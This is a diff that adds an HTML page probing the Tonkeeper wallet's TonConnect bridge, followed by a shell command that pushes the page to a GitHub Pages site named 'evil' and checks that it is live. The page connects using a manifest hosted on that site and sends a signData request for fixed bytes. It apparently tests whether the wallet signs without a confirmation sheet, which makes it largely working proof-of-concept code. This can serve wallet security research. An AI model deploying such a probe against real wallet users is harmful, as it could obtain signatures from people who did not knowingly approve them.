@@ -1,0 +1,23 @@
+<!doctype html><html><body style="font:14px monospace;padding:10px;background:#fff">
+<div id="s">SIGN2-BOOT</div><div id="t"></div>
+<script>
+var s=document.getElementById('s'),t=document.getElementById('t');
+function L(x){t.innerHTML+='<div>'+String(x).slice(0,250)+'</div>';}
+L('BOOT origin='+location.origin+' t='+Date.now());
+if(!(window.tonkeeper&&window.tonkeeper.tonconnect)){L('NO_BRIDGE');}
+else{
+L('HAS_BRIDGE');
+var b=window.tonkeeper.tonconnect;
+b.listen(function(ev){L('EVT '+(ev&&ev.event))});
+b.connect(2,{manifestUrl:'https://goodman387.github.io/evil/manifest.json',items:[{name:'ton_addr'}]}).then(function(r){
+  L('CONNECT_RESOLVED');s.textContent='SIGN2:CONNECTED';
+  var btn=document.createElement('button');btn.textContent='SEND FRESH signData id='+(Date.now()%1000);btn.style.cssText='font:20px monospace;padding:18px;width:100%;background:#fd0';
+  var myid=Date.now();
+  btn.onclick=function(){ s.textContent='SIGN2:SENT_WAIT'; L('sending id='+myid+' at '+Date.now());
+    b.send({id:myid,method:'signData',params:{type:'binary',bytes:'RlJFU0ggU0lHTiAyNi4wOSAwIC0gdGhpcyBpcyBhIG5ldyBwcm9vZSA='}}).then(function(res){s.textContent='SIGN2:SIGNED_NO_SHEET?';L('RES '+JSON.stringify(res).slice(0,200));},function(e){s.textContent='SIGN2:ERR';L('ERR '+e);});
+  };
+  document.body.appendChild(btn);
+},function(e){L('CONNECT_REJ');s.textContent='SIGN2:CONNECT_REJ';});
+}
+</script></body></EOF>
+cd /tmp/opencode/dyn3/ghpages && cp /tmp/opencode/dyn3/ghpages/sign2.html . 2>/dev/null; git add -A && git commit -q -m "sign2 fresh-id probe" && git push -q origin HEAD:master 2>&1|tail -1; echo PUSHED; sleep 40; curl -s -o /dev/null -w "%{http_code}\n" https://goodman387.github.io/evil/sign2.html
